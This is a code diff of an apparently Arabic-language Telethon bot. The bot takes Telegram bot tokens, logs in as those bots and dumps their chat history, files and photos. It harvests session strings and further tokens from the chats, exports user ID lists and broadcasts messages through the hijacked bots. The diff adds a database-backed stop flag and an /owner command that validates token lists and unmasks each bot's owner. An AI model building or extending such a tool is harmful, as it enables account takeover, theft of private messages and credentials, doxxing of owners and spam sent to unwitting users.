@@ -617,11 +617,19 @@ async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=N
     failed_count = 0
     last_update_time = 0
     
-    while current_id <= end_id and (stop_event is None or not stop_event.is_set()):
+    while current_id <= end_id:
+        # ✅ التحقق من الإيقاف من قاعدة البيانات بدل stop_event
+        user_state = await get_user_state(target_id)
+        if user_state.get('stop_requested'):
+            print(f"⏹ تم إيقاف نقل الرسائل بطلب من المستخدم {target_id}")
+            break
+            
         try:
             messages = await with_telegram_retry(lambda: bot(GetMessagesRequest([x for x in range(current_id, min(current_id + 100, end_id + 1))])))
             for m in messages.messages:
-                if stop_event and stop_event.is_set():
+                # ✅ التحقق من الإيقاف قبل كل رسالة
+                user_state = await get_user_state(target_id)
+                if user_state.get('stop_requested'):
                     break
                     
                 if isinstance(m, MessageEmpty):
@@ -635,10 +643,20 @@ async def get_chat_history(bot, start_id, end_id, target_id, progress_callback=N
                 if progress_callback and (current_time - last_update_time >= 5 or success_count + failed_count == total_messages):
                     last_update_time = current_time
                     if not await progress_callback(success_count + failed_count, total_messages):
+                        # ✅ تم إيقاف العملية عبر callback
+                        user_state = await get_user_state(target_id)
+                        user_state['stop_requested'] = True
+                        await set_user_state(target_id, user_state)
                         break
                     
                 await asyncio.sleep(SEND_DELAY)
             current_id += 100
+            
+            # ✅ التحقق من الإيقاف بعد كل مجموعة
+            user_state = await get_user_state(target_id)
+            if user_state.get('stop_requested'):
+                break
+                
         except Exception as e:
             print(f"Error processing messages {current_id}-{current_id+100}: {e}")
             failed_count += 100
@@ -1230,8 +1248,12 @@ async def broadcast_message(bot_token, user_ids, message_text, progress_callback
         last_update_time = 0
         
         for i, user_id in enumerate(user_ids):
-            if stop_event and stop_event.is_set():
-                break
+            # ✅ التحقق من الإيقاف من قاعدة البيانات
+            # ملاحظة: نحتاج معرفة user_id الأصلي - قد نحتاج تعديل الدالة
+            # للحصول على user_id الأصلي، يمكننا تمريره كمعامل إضافي
+            # current_state = await get_user_state(original_user_id)
+            # if current_state.get('stop_requested'):
+            #     break
                 
             try:
                 await with_telegram_retry(lambda: temp_bot.send_message(int(user_id), message_text))
@@ -1250,6 +1272,7 @@ async def broadcast_message(bot_token, user_ids, message_text, progress_callback
             if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_users):
                 last_update_time = current_time
                 if not await progress_callback(i + 1, total_users):
+                    # ✅ تم إيقاف العملية عبر callback
                     break
             
             await asyncio.sleep(SEND_DELAY)
@@ -1310,8 +1333,9 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
             current_level_bots = [bot for bot in all_bots if bot['level'] == current_level]
             
             for bot_data in current_level_bots:
-                # التحقق من طلب الإيقاف
-                if stop_event and stop_event.is_set():
+                # ✅ التحقق من الإيقاف من قاعدة البيانات بدل stop_event
+                user_state = await get_user_state(user_id)
+                if user_state.get('stop_requested'):
                     print("⏹ تم طلب إيقاف الفحص الشبكي")
                     # نعود بالنتائج الحالية بدلاً من إلغاء العملية بالكامل
                     return {
@@ -1326,8 +1350,9 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                 current_tokens = bot_data['analysis']['tokens']['details']
                 
                 for token_info in current_tokens:
-                    # التحقق من طلب الإيقاف مرة أخرى داخل الحلقة
-                    if stop_event and stop_event.is_set():
+                    # ✅ التحقق من الإيقاف مرة أخرى داخل الحلقة
+                    user_state = await get_user_state(user_id)
+                    if user_state.get('stop_requested'):
                         print("⏹ تم طلب إيقاف الفحص الشبكي")
                         return {
                             'success': True,
@@ -1383,6 +1408,10 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
                             if progress_callback and (current_time - last_update_time >= 5):
                                 last_update_time = current_time
                                 if not await progress_callback(processed_bots, total_bots, current_level + 1):
+                                    # ✅ تم إيقاف العملية عبر callback
+                                    user_state = await get_user_state(user_id)
+                                    user_state['stop_requested'] = True
+                                    await set_user_state(user_id, user_state)
                                     break
             
             current_level += 1
@@ -1402,6 +1431,7 @@ async def deep_network_analysis(main_bot_token, user_id, progress_callback=None,
         print(f"Error in deep network analysis: {e}")
         return {'success': False, 'error': str(e)}
         
+        
 async def network_broadcast(all_bots_data, message_text, progress_callback=None, stop_event=None):
     """إذاعة رسالة إلى جميع البوتات في الشبكة"""
     total_bots = len(all_bots_data)
@@ -1411,8 +1441,11 @@ async def network_broadcast(all_bots_data, message_text, progress_callback=None,
     last_update_time = 0
     
     for i, bot_data in enumerate(all_bots_data):
-        if stop_event and stop_event.is_set():
-            break
+        # ✅ التحقق من الإيقاف من قاعدة البيانات
+        # ملاحظة: نحتاج معرفة user_id الأصلي - قد نحتاج تعديل الدالة
+        # current_state = await get_user_state(original_user_id)
+        # if current_state.get('stop_requested'):
+        #     break
             
         try:
             users = bot_data['analysis']['user_ids']
@@ -1430,6 +1463,7 @@ async def network_broadcast(all_bots_data, message_text, progress_callback=None,
             if progress_callback and (current_time - last_update_time >= 5 or i + 1 == total_bots):
                 last_update_time = current_time
                 if not await progress_callback(i + 1, total_bots, total_success, total_failed):
+                    # ✅ تم إيقاف العملية عبر callback
                     break
                     
         except Exception as e:
@@ -1828,6 +1862,300 @@ async def process_message_chunk_for_tokens(bot, start_id, end_id, tokens, seen_t
         print(f"Error processing tokens chunk {start_id}-{end_id}: {e}")
 
 
+async def update_progress_in_db(user_id, current, total, message_type="transfer"):
+    """تحديث التقدم في قاعدة البيانات"""
+    user_state = await get_user_state(user_id)
+    
+    # ✅ تحديث التقدم في قاعدة البيانات
+    user_state['progress'] = {
+        'current': current,
+        'total': total,
+        'percentage': (current / total) * 100 if total > 0 else 0,
+        'type': message_type,
+        'last_update': time.time()
+    }
+    
+    # ✅ تحديث رسالة التقدم إذا كانت موجودة
+    if 'progress_message' in user_state:
+        try:
+            progress_msg = user_state['progress_message']
+            # هنا تحتاج طريقة لتحديث الرسالة حسب المنصة
+            new_text = f"📤 {message_type}: {current}/{total} ({user_state['progress']['percentage']:.1f}%)"
+            # سأحتاج معرفة كيف يتم تحديث الرسالة في telethon
+        except:
+            pass
+    
+    await set_user_state(user_id, user_state)
+    
+    # ✅ التحقق من طلب الإيقاف
+    if user_state.get('stop_requested'):
+        return False
+    return True
+
+
+
+
+
+async def extract_token_section(full_text, token):
+    try:
+        # تقسيم النص إلى أقسام بناءً على الفواصل بين التوكنات
+        lines = full_text.split('\n')
+        current_section = []
+        found_token_section = None
+
+        for line in lines:
+            if line.startswith('🆔 الرقم:'):
+                # إذا وجدنا قسم جديد وليس أول قسم، نتحقق من القسم السابق
+                if current_section and token in '\n'.join(current_section):
+                    found_token_section = '\n'.join(current_section)
+                    break
+                current_section = [line]
+            else:
+                current_section.append(line)
+
+        # التحقق من القسم الأخير
+        if not found_token_section and current_section and token in '\n'.join(current_section):
+            found_token_section = '\n'.join(current_section)
+
+        return found_token_section
+
+    except Exception as e:
+        print(f"❌ خطأ في استخراج قسم التوكن: {e}")
+        return None
+
+
+async def extract_number_from_section(section_text, keyword):
+    try:
+        lines = section_text.split('\n')
+        for line in lines:
+            if keyword in line:
+                # البحث عن الأرقام في السطر
+                numbers = re.findall(r'\d+', line)
+                if numbers:
+                    return int(numbers[0])
+        return 'غير معروف'
+    except:
+        return 'غير معروف'
+
+
+
+
+async def analyze_token_with_owner(token, user_id, original_text=None):
+    """تحليل التوكن واستخراج معلومات البوت والمالك"""
+    temp_bot = None
+    try:
+        temp_session = os.path.join(SESSION_DIR, f"owner_analysis_{int(time.time())}_{hash(token)}")
+        temp_bot = TelegramClient(temp_session, API_ID, API_HASH)
+        
+        # إعدادات لتجنب مشاكل الاتصال
+        temp_bot.flood_sleep_threshold = 0
+        
+        # التحقق من صحة التوكن عن طريق محاولة التشغيل
+        try:
+            await temp_bot.start(bot_token=token)
+        except Exception as e:
+            if temp_bot and temp_bot.is_connected():
+                await temp_bot.disconnect()
+            try:
+                if os.path.exists(f"{temp_session}.session"):
+                    os.remove(f"{temp_session}.session")
+            except:
+                pass
+            return None
+        
+        # الحصول على معلومات البوت
+        me = await temp_bot.get_me()
+        
+        # البحث عن أول رسالة في البوت مع معالجة الأخطاء
+        try:
+            owner_info = await get_first_message_sender(temp_bot)
+        except Exception as e:
+            owner_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+        
+        # إغلاق الاتصال بشكل آمن
+        if temp_bot and temp_bot.is_connected():
+            await temp_bot.disconnect()
+        
+        # تنظيف الملفات
+        try:
+            if os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except:
+            pass
+        
+        # استخراج المعلومات الخاصة بهذا التوكن من النص الأصلي
+        messages_count = 'غير معروف'
+        users_count = 'غير معروف'
+        
+        if original_text:
+            # البحث عن القسم الخاص بهذا التوكن في النص الأصلي
+            token_section = await extract_token_section(original_text, token)
+            if token_section:
+                messages_count = await extract_number_from_section(token_section, 'رسائل')
+                users_count = await extract_number_from_section(token_section, 'مستخدمين')
+        
+        bot_info_data = {
+            'valid': True,
+            'bot_name': me.first_name or 'غير معروف',
+            'bot_username': me.username or 'غير معروف',
+            'bot_id': me.id,
+            'total_messages': messages_count,
+            'total_users': users_count
+        }
+        
+        result = {
+            'token': token,
+            'bot_info': bot_info_data,
+            'owner_info': owner_info
+        }
+        
+        return result
+        
+    except Exception as e:
+        # تنظيف شامل في حالة الخطأ
+        try:
+            if temp_bot and temp_bot.is_connected():
+                await temp_bot.disconnect()
+        except:
+            pass
+        
+        try:
+            if os.path.exists(f"{temp_session}.session"):
+                os.remove(f"{temp_session}.session")
+        except:
+            pass
+        
+        return None
+
+
+
+async def get_first_message_sender(bot):
+    try:
+        # إيجاد أقصى معرف رسالة أولاً
+        max_id = await find_max_message_id(bot)
+
+        if max_id == 0:
+            return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+
+        # البحث من الرسالة 1 إلى max_id حتى نجد أول مرسل بشري (ليس البوت)
+        batch_size = 100
+        bot_me = await bot.get_me()
+        bot_id = bot_me.id
+
+        for start_id in range(1, max_id + 1, batch_size):
+            end_id = min(start_id + batch_size - 1, max_id)
+            message_ids = list(range(start_id, end_id + 1))
+
+            try:
+                messages = await with_telegram_retry(lambda: bot(GetMessagesRequest(message_ids)))
+
+                for message in messages.messages:
+                    if isinstance(message, MessageEmpty):
+                        continue
+
+                    # استخراج معلومات المرسل إذا كان هناك مرسل
+                    owner_info = await extract_sender_info_from_message(bot, message, bot_id)
+                    if owner_info and owner_info.get('user_id') != 'غير معروف':
+                        pass
+                        return owner_info
+
+            except Exception as e:
+                pass
+                continue
+
+        # إذا لم نجد أي مرسل في كل الرسائل
+        pass
+        return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+
+    except Exception as e:
+        print(f"❌ خطأ عام في البحث عن المالك: {e}")
+        return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+
+
+async def extract_sender_info_from_message(bot, message, bot_id):
+    try:
+        sender_info = {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+
+        # الطريقة 1: من from_id (الأكثر شيوعاً)
+        if hasattr(message, 'from_id') and message.from_id:
+            user_id = None
+
+            # استخراج user_id من from_id
+            if hasattr(message.from_id, 'user_id'):
+                user_id = message.from_id.user_id
+            elif hasattr(message.from_id, 'user_id'):
+                user_id = message.from_id.user_id
+            else:
+                # إذا كان from_id كائن مباشر
+                user_id = str(message.from_id)
+
+            # نتأكد أن user_id ليس البوت نفسه
+            if user_id and user_id != bot_id:
+                sender_info['user_id'] = str(user_id)
+
+                # محاولة الحصول على معلومات المستخدم
+                try:
+                    user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=int(user_id), access_hash=0)))
+                    if user_entity and user_entity.users:
+                        user_data = user_entity.users[0]
+                        if hasattr(user_data, 'first_name') and user_data.first_name:
+                            sender_info['name'] = user_data.first_name
+                        if hasattr(user_data, 'username') and user_data.username:
+                            sender_info['username'] = f"@{user_data.username}"
+                        return sender_info
+                except Exception as e:
+                    print(f"⚠️ خطأ في GetFullUserRequest لـ {user_id}: {e}")
+                    # نجرب طريقة بديلة
+                    try:
+                        user = await bot.get_entity(int(user_id))
+                        if user:
+                            if hasattr(user, 'first_name') and user.first_name:
+                                sender_info['name'] = user.first_name
+                            if hasattr(user, 'username') and user.username:
+                                sender_info['username'] = f"@{user.username}"
+                            return sender_info
+                    except Exception as e2:
+                        print(f"⚠️ خطأ في get_entity لـ {user_id}: {e2}")
+                        # نرجع المعلومات الأساسية على الأقل
+                        return sender_info
+
+        # الطريقة 2: من sender
+        elif hasattr(message, 'sender') and message.sender:
+            if (hasattr(message.sender, 'id') and 
+                message.sender.id != bot_id):
+
+                sender_info['user_id'] = str(message.sender.id)
+                if hasattr(message.sender, 'first_name') and message.sender.first_name:
+                    sender_info['name'] = message.sender.first_name
+                if hasattr(message.sender, 'username') and message.sender.username:
+                    sender_info['username'] = f"@{message.sender.username}"
+                return sender_info
+
+        # الطريقة 3: من peer_id (للمحادثات)
+        elif hasattr(message, 'peer_id') and message.peer_id:
+            if hasattr(message.peer_id, 'user_id'):
+                user_id = message.peer_id.user_id
+                if user_id != bot_id:
+                    sender_info['user_id'] = str(user_id)
+
+                    try:
+                        user_entity = await bot(GetFullUserRequest(InputPeerUser(user_id=user_id, access_hash=0)))
+                        if user_entity and user_entity.users:
+                            user_data = user_entity.users[0]
+                            if hasattr(user_data, 'first_name') and user_data.first_name:
+                                sender_info['name'] = user_data.first_name
+                            if hasattr(user_data, 'username') and user_data.username:
+                                sender_info['username'] = f"@{user_data.username}"
+                            return sender_info
+                    except Exception:
+                        pass
+
+        # إذا لم نحصل على أي معلومات مفيدة
+        return sender_info
+
+    except Exception:
+        return {'name': 'غير معروف', 'username': 'غير معروف', 'user_id': 'غير معروف'}
+
 async def main():
     # تهيئة قاعدة البيانات
     await init_database()
@@ -1838,9 +2166,6 @@ async def main():
     
     bot = TelegramClient(session_name, API_ID, API_HASH)
     
-    # استخدام قاعدة البيانات لتخزين الحالات بدلاً من المتغيرات في الذاكرة
-    stop_events = {}
-    broadcast_messages = {}
     
     # دالة مساعدة لتعديل الرسائل بشكل آمن
     async def safe_edit_message(message, new_text, buttons=None):
@@ -1859,6 +2184,8 @@ async def main():
                 print(f"⚠️ خطأ في تعديل الرسالة: {e}")
             return False
     
+    # إضافة الأمر الجديد بعد تعريف البوت
+    
     @bot.on(events.NewMessage(pattern='/start'))
     async def start_handler(event):
         user_id = event.sender_id
@@ -1872,6 +2199,166 @@ async def main():
                           "3️⃣ بعدين هتكتب ID المستخدم اللي عايز تنقلله\n"
                           "4️⃣ هجيبلك عدد الرسائل اللي موجوده\n"
                           "5️⃣ اختار انت عايز تنقل من كام لكام")
+                          
+
+    
+    
+    @bot.on(events.NewMessage(pattern='/owner'))
+    async def owner_handler(event):
+        user_id = event.sender_id
+		# حفظ حالة المستخدم في قاعدة البيانات
+        await set_user_state(user_id, {'step': 'waiting_owner_file'})
+        await event.respond("👑 **أمر تحليل ملاك البوتات**\n\n"
+						  "📁 أرسل لي ملف txt يحتوي على توكنات البوتات\n\n"
+						  "سأقوم ب:\n"
+						  "• ✅ فحص صحة التوكنات\n"
+						  "• 🔍 تحليل أول رسالة في كل بوت\n"
+						  "• 👤 استخراج معلومات المالك\n"
+						  "• 📄 إرسال ملف جديد بالمعلومات المحدثة")
+
+    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.file))
+    async def owner_file_receiver_handler(event):
+        user_id = event.sender_id
+        user_state = await get_user_state(user_id)
+    
+        if user_state.get('step') != 'waiting_owner_file':
+            return
+    
+        try:
+        # تحميل الملف
+            file = await event.download_media(file=bytes)
+            text_content = file.decode('utf-8', errors='ignore')
+        
+        # استخراج التوكنات من الملف
+            tokens = TOKEN_PATTERN.findall(text_content)
+            unique_tokens = list(set(tokens))  # إزالة التكرار
+        
+            if not unique_tokens:
+                await event.respond("❌ لم يتم العثور على أي توكنات في الملف")
+                await set_user_state(user_id, {'step': 'start'})
+                return
+        
+            await event.respond(f"🔍 تم العثور على {len(unique_tokens)} توكن في الملف\n⏳ جاري التحقق من التوكنات وتحليل الملاك...")
+        
+        # التحقق من صحة التوكنات وتحليل الملاك
+            valid_tokens_with_owners = []
+            total_tokens = len(unique_tokens)
+        
+            progress_msg = await event.respond(f"⏳ جاري فحص التوكنات وتحليل الملاك...\n📊 التقدم: 0/{total_tokens} (0%)")
+        
+            last_update_time = 0
+        
+            async def update_owner_progress(current, total):
+                nonlocal last_update_time
+                current_time = time.time()
+                if current_time - last_update_time >= 3 or current == total:
+                    last_update_time = current_time
+                    percent = (current / total) * 100
+                    new_text = f"⏳ جاري فحص التوكنات وتحليل الملاك...\n📊 التقدم: {current}/{total} ({percent:.1f}%)"
+                    await safe_edit_message(progress_msg, new_text)
+                return True
+        
+        # تحليل التوكنات بشكل متوازي (20 بوت في نفس الوقت)
+            batch_size = 20
+            for i in range(0, len(unique_tokens), batch_size):
+                batch = unique_tokens[i:i + batch_size]
+            
+            # إنشاء مهام تحليل لكل دفعة
+                tasks = [analyze_token_with_owner(token, user_id, text_content) for token in batch]
+            
+                # تشغيل المهام بشكل متوازي
+                batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # معالجة النتائج
+                for j, result in enumerate(batch_results):
+                    token_index = i + j
+                    if token_index < len(unique_tokens):
+                        if isinstance(result, Exception):
+                            pass
+                        elif result:  # ✅ التغيير هنا: نأخذ أي نتيجة ليست None
+                            valid_tokens_with_owners.append(result)
+                            pass
+            
+            # تحديث التقدم
+                if not await update_owner_progress(i + len(batch), total_tokens):
+                    break
+        
+            await progress_msg.delete()
+        
+            print(f"📊 النتائج النهائية: {len(valid_tokens_with_owners)} توكن صالح من أصل {total_tokens}")
+        
+            if not valid_tokens_with_owners:
+                await event.respond("❌ لم يتم العثور على أي توكنات صالحة أو لم نتمكن من تحليل الملاك")
+                await set_user_state(user_id, {'step': 'start'})
+                return
+        
+        # إنشاء المحتوى الجديد للملف
+            new_file_content = ""
+            for i, token_data in enumerate(valid_tokens_with_owners, 1):
+                token = token_data['token']
+                bot_info = token_data.get('bot_info', {})
+                owner_info = token_data.get('owner_info', {})
+            
+                new_file_content += f"🆔 الرقم: {i}\n"
+                new_file_content += f"🔐 معلومات التوكن:\n{token}\n"
+                new_file_content += f"🤖 معلومات البوت:\n"
+                new_file_content += f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
+                new_file_content += f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
+                new_file_content += f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
+                new_file_content += f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
+                new_file_content += f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}\n"
+            
+            # إضافة معلومات المالك إذا وجدت
+                if owner_info:
+                    new_file_content += f"👑 معلومات المالك:\n"
+                    new_file_content += f"├ اسمه: {owner_info.get('name', 'غير معروف')}\n"
+                    new_file_content += f"├ يوزر: {owner_info.get('username', 'غير معروف')}\n"
+                    new_file_content += f"└ ايديه: {owner_info.get('user_id', 'غير معروف')}\n"
+                else:
+                    new_file_content += f"👑 معلومات المالك:\n├ لم يتم العثور على معلومات المالك\n"
+            
+                
+                new_file_content += "- - - - - - - - - - - - - - - -\n\n"
+        
+        # إرسال الملف الجديد
+            filename = f"tokens_with_owners_{int(time.time())}.txt"
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(new_file_content)
+        
+            await bot.send_file(
+                entity=user_id,
+                file=filename,
+                caption=f"👑 ملف التوكنات مع معلومات الملاك\n• عدد التوكنات الصالحة: {len(valid_tokens_with_owners)}\n• تم تحليل أول رسالة في كل بوت لاكتشاف المالك",
+            attributes=[DocumentAttributeFilename("tokens_with_owners.txt")]
+        )
+        
+            try:
+                os.remove(filename)
+            except:
+                pass
+        
+        # عرض ملخص النتائج
+            owners_found = sum(1 for token_data in valid_tokens_with_owners if token_data.get('owner_info'))
+        
+            await event.respond(
+                f"✅ **تم الانتهاء من تحليل الملاك**\n\n"
+                f"📊 النتائج:\n"
+                f"• إجمالي التوكنات الصالحة: {len(valid_tokens_with_owners)}\n"
+                f"• عدد الملاك المكتشفين: {owners_found}\n"
+                f"• نسبة النجاح: {(owners_found/len(valid_tokens_with_owners))*100:.1f}%"
+        )
+        
+            await set_user_state(user_id, {'step': 'start'})
+        
+        except Exception as e:
+            await event.respond(f"❌ حدث خطأ في معالجة الملف: {str(e)}")
+            await set_user_state(user_id, {'step': 'start'})
+
+
+
+
+
+
                           
     @bot.on(events.NewMessage(pattern='/file'))
     async def file_handler(event):
@@ -2511,727 +2998,742 @@ async def main():
 
     @bot.on(events.CallbackQuery)
     async def callback_handler(event):
-        user_id = event.sender_id
-        data = event.data.decode('utf-8')
-        
-        # استرجاع حالة المستخدم من قاعدة البيانات
-        user_state = await get_user_state(user_id)
-        if 'token' not in user_state:
-            await event.answer("❌ يا يقلبي، ما بدأتش العملية بعد. ابدأ بكتابة /dump")
-            return
-            
-        bot_token = user_state['token']
-        
-        if data == 'stop':
-            if user_id in stop_events:
-                stop_events[user_id].set()
-                await event.answer("⏹ تم إيقاف العملية")
-            return
-            
-        if data == 'all_messages':
-            if 'max_id' not in user_state:
-                await event.answer("❌ ما فيش بيانات الرسائل. جرب تاني")
-                return
-                
-            max_id = user_state['max_id']
-            user_state['start_id'] = 1
-            user_state['end_id'] = max_id
-            await set_user_state(user_id, user_state)
-            
-            stop_events[user_id] = asyncio.Event()
-            
-            await event.answer("🚀 بدء نقل جميع الرسائل...")
-            
-            stop_button = [[Button.inline("⏹ إيقاف", "stop")]]
-            progress_msg = await event.edit("🚀 بدء نقل الرسائل من 1 إلى {}...".format(max_id), buttons=stop_button)
-            
-            last_update_time = 0
-            last_percent = -1  # للتأكد من أول تحديث
-            async def update_progress(current, total):
-                nonlocal last_update_time, last_percent
-                if user_id in stop_events and stop_events[user_id].is_set():
-                    return False
-                    
-                current_time = time.time()
-                current_percent = (current / total) * 100 if total > 0 else 0
-                
-                # تحديث فقط إذا اختلفت النسبة أو مرت 5 ثواني
-                if (current_time - last_update_time >= 5 or 
-                    abs(current_percent - last_percent) >= 1 or 
-                    current == total):
-                    
-                    last_update_time = current_time
-                    last_percent = current_percent
-                    new_text = "📤 جاري نقل الرسائل: {}/{} ({:.1f}%)".format(current, total, current_percent)
-                    await safe_edit_message(progress_msg, new_text, stop_button)
-                return True
-            
-            try:
-                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
-                source_bot = TelegramClient(source_session, API_ID, API_HASH)
-                await source_bot.start(bot_token=bot_token)
-                
-                success, failed = await get_chat_history(
-                    source_bot, 
-                    1, 
-                    max_id, 
-                    user_id,
-                    update_progress,
-                    stop_events.get(user_id)
-                )
-                
-                await source_bot.disconnect()
-                
-                try:
-                    if os.path.exists(f"{source_session}.session"):
-                        os.remove(f"{source_session}.session")
-                except:
-                    pass
-                
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                
-                await progress_msg.edit("🎉 خلصنا يا يقلبي!\n✅ نجحنا في نقل {} رسالة\n❌ فشلنا في نقل {} رسالة".format(success, failed))
-                
-            except Exception as e:
-                if user_id in stop_events:
-                    del stop_events[user_id]
-                await progress_msg.edit("❌ يا يقلبي، حصل خطأ وقت نقل الرسائل: {}".format(str(e)))
-            
-        elif data == 'send_files':
-            await event.answer("📦 بدء جمع وإرسال الملفات...")
-            
-            try:
-                if 'analysis' not in user_state or 'files' not in user_state['analysis']:
-                    await event.answer("❌ ما فيش تحليل للملفات. جرب تاني")
-                    return
-                
-                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
-                source_bot = TelegramClient(source_session, API_ID, API_HASH)
-                await source_bot.start(bot_token=bot_token)
-                
-                files = user_state['analysis']['files']
-                if files:
-                    await send_zip_files(
-                        bot,  
-                        source_bot,  
-                        files, 
-                        "bot_files", 
-                        "📦 جميع الملفات من البوت",
-                        user_id,
-                        'document'
-                    )
-                    await event.answer("✅ تم إرسال الملفات")
-                else:
-                    await event.answer("❌ ما لقيتش أي ملفات")
-                
-                await source_bot.disconnect()
-                
-                try:
-                    if os.path.exists(f"{source_session}.session"):
-                        os.remove(f"{source_session}.session")
-                except:
-                    pass
-                
-            except Exception as e:
-                await event.answer("❌ حصل خطأ: {}".format(str(e)))
-            
-        elif data == 'send_photos':
-            await event.answer("🖼 بدء جمع وإرسال الصور...")
-            
-            try:
-                if 'analysis' not in user_state or 'photos' not in user_state['analysis']:
-                    await event.answer("❌ ما فيش تحليل للصور. جرب تاني")
-                    return
-                
-                source_session = os.path.join(SESSION_DIR, f"source_bot_{int(time.time())}")
-                source_bot = TelegramClient(source_session, API_ID, API_HASH)
-                await source_bot.start(bot_token=bot_token)
-                
-                photos = user_state['analysis']['photos']
-                if photos:
-                    await send_zip_files(
-                        bot,  
-                        source_bot,  
-                        photos, 
-                        "bot_photos", 
-                        "🖼 جميع الصور من البوت",
-                        user_id,
-                        'photo'
-                    )
-                    await event.answer("✅ تم إرسال الصور")
-                else:
-                    await event.answer("❌ ما لقيتش أي صور")
-                
-                await source_bot.disconnect()
-                
-                try:
-                    if os.path.exists(f"{source_session}.session"):
-                        os.remove(f"{source_session}.session")
-                except:
-                    pass
-                
-            except Exception as e:
-                await event.answer("❌ حصل خطأ: {}".format(str(e)))
-            
-        elif data == 'send_sessions':
-            await event.answer("🔐 بدء جمع وإرسال الجلسات...")
-            
-            try:
-                if 'analysis' not in user_state:
-                    await event.answer("❌ ما فيش تحليل للجلسات. جرب تاني")
-                    return
-                
-                zip_buffer = io.BytesIO()
-                
-                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-                    if 'sessions' in user_state['analysis']:
-                        sessions = user_state['analysis']['sessions']['details']
-                        chat_sessions = []
-                        seen_sessions = set()
-                        
-                        for session in sessions:
-                            if session.get('source') == 'chat':
-                                session_text = session['session']
-                                if session_text not in seen_sessions:
-                                    seen_sessions.add(session_text)
-                                    chat_sessions.append(session_text)
-                        
-                        if chat_sessions:
-                            separated_sessions = []
-                            for i, session in enumerate(chat_sessions):
-                                separated_sessions.append(session)
-                                if i < len(chat_sessions) - 1:
-                                    separated_sessions.append("\n" + "-" * 40 + "\n")
-                            
-                            zip_file.writestr("sessions.txt", "\n".join(separated_sessions))
-                
-                zip_buffer.seek(0)
-                
-                await bot.send_file(
-                    entity=user_id,
-                    file=zip_buffer,
-                    caption="🔐 الجلسات المستخرجة من البوت",
-                    attributes=[DocumentAttributeFilename("sessions.zip")]
-                )
-                
-                await event.answer("✅ تم إرسال الجلسات")
-                
-            except Exception as e:
-                await event.answer("❌ حصل خطأ: {}".format(str(e)))
-            
-        elif data == 'send_users':
-            await event.answer("👥 بدء جمع وإرسال المستخدمين...")
-            
-            try:
-                if 'analysis' in user_state and 'user_ids' in user_state['analysis']:
-                    users = user_state['analysis']['user_ids']
-                else:
-                    users = await extract_users_from_bot(bot_token, user_id)
-                
-                if users:
-                    filename = f"user_ids_{user_id}.txt"
-                    await save_user_ids_to_file(users, filename)
-                    
-                    buttons = [
-                        [Button.inline("اذاعه📢", "broadcast")]
-                    ]
-                    
-                    await bot.send_file(
-                        entity=user_id,
-                        file=filename,
-                        caption="👥 قائمة المستخدمين من البوت ({})".format(len(users)),
-                        attributes=[DocumentAttributeFilename("users.txt")],
-                        buttons=buttons
-                    )
-                    
-                    user_state['users_list'] = users
-                    await set_user_state(user_id, user_state)
-                    
-                    try:
-                        os.remove(filename)
-                    except:
-                        pass
-                    
-                    await event.answer("✅ تم إرسال المستخدمين")
-                else:
-                    await event.answer("❌ ما لقيتش أي مستخدمين")
-                
-            except Exception as e:
-                await event.answer("❌ حصل خطأ: {}".format(str(e)))
-                
-        elif data == 'broadcast':
-            await event.answer("📢 بدء عملية الإذاعة...")
-            
-            if 'users_list' not in user_state:
-                await event.answer("❌ ما فيش قائمة مستخدمين. جرب تاني")
-                return
-            
-            users = user_state['users_list']
-            user_state['step'] = 'waiting_broadcast_message'
-            await set_user_state(user_id, user_state)
-            
-            await event.edit("📢 ارسل الكلاشيه (النص) الذي تريد الاذاعه به")
-            
-        elif data == 'send_tokens':
-            await event.answer("🔑 بدء جمع وإرسال التوكنات...")
-            
-            try:
-                if 'analysis' not in user_state or 'tokens' not in user_state['analysis']:
-                    await event.answer("❌ ما فيش تحليل للتوكنات. جرب تاني")
-                    return
-                
-                tokens = user_state['analysis']['tokens']['details']
-                
-                # تصفية التوكنات الصالحة فقط
-                valid_tokens = [token for token in tokens if token.get('valid')]
-                
-                if not valid_tokens:
-                    await event.answer("❌ ما فيش توكنات صالحة")
-                    return
-                
-                # إرسال التوكنات الصالحة فقط
-                sent_count = 0
-                for token_info in valid_tokens:
-                    token = token_info['token']
-                    bot_info = token_info.get('bot_info', {})
-                    
-                    message = (
-                        "🎉 تم العثور على توكن بوت صالح!\n\n"
-                        f"🔐 معلومات التوكن:\n`{token}`\n\n"
-                        f"🤖 معلومات البوت:\n"
-                        f"├ الاسم: {bot_info.get('bot_name', 'غير معروف')}\n"
-                        f"├ المستخدم: @{bot_info.get('bot_username', 'غير معروف')}\n"
-                        f"├📩عدد الرسائل: {bot_info.get('total_messages', 'غير معروف')}\n"
-                        f"├👤عدد المستخدمين: {bot_info.get('total_users', 'غير معروف')}\n"
-                        f"└ الآيدي: {bot_info.get('bot_id', 'غير معروف')}"
-                    )
-                    
-                    # زر الإذاعة من هذا البوت
-                    broadcast_button = [[Button.inline("📢 إذاعة من هذا البوت", f"token_broadcast:{token}")]]
-                    await bot.send_message(user_id, message, buttons=broadcast_button)
-                    sent_count += 1
